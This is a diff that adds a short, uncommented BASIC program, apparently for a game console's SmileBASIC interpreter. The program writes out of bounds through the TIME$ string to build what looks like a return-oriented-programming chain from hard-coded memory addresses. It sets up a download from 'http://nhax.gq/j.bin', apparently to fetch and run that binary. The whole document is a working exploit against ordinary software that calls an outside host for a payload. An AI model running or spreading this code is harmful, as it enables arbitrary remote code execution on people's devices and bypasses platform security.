@@ -1,0 +1,61 @@
+URL$="http://nhax.gq/j.bin"
+A=1<<22
+DEF P V
+X=(A-&H2BB610)>>1
+TIME$[X]=CHR$(V AND &HFFFF)
+TIME$[X+1]=CHR$(V>>16)
+INC A,4
+END
+DEF U S$
+S$=S$+CHR$(0)*4
+FOR I=0 TO LEN(S$)-5 STEP 4
+FOR J=0 TO 3
+N=N OR ASC(S$[I+J])<<J*8
+NEXT
+P N
+N=0
+NEXT
+END
+X=&H134124
+Y=&H27510D
+F=A>>5
+S=A
+R=S+F
+L=R+F
+Z=L+F
+D=Z+F
+A=L
+U URL$
+A=R
+P Y
+P Z
+P L
+P 1
+P &H1CC340
+A=A+28
+P &H1045D4
+A=A+8
+P X
+P Z
+P &H256674
+P 0
+P Y
+P Z
+P D
+P F
+P &H1CCFEC
+P 0
+P Y
+P D
+P &H104450
+P 0
+P &H134128
+A=S-12
+P R
+P X
+P &H112A70
+P S
+A=S+16
+P &H1F54DC
+A=&H2EC9D4
+P S
